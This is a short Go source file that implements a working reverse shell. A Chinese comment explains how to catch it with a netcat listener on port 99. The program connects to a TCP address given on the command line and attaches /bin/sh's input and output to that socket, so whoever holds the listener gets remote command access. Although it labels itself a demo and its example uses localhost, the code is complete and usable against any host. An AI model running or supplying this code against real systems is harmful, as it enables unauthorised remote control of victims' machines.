/* 
#
# -- 用 "nc -p 99" 监听本地99端口
# -- 执行 "./reverse-shell 127.0.0.1:99", 即可得到一个 reverse-shell  
#
*/

package main 
import(
	"fmt"
	"os"
	"net"
	"log"
	"os/exec"
)

var (
	shell = "/bin/sh"
	remoteIp string
)

func main(){ 
		if len(os.Args) < 2{
			fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
			os.Exit(1)
		}

		remoteIp = os.Args[1]

		remoteConn, err := net.Dial("tcp", remoteIp)
		if err!= nil{
			log.Fatal("Error connecting: ", err )
		}

		_, _ = remoteConn.Write([]byte("reverse shell demo"))

		command := exec.Command(shell)
		command.Env = os.Environ()
		command.Stdin = remoteConn
		command.Stdout = remoteConn
		command.Stderr = remoteConn
		_ = command.Run()

}
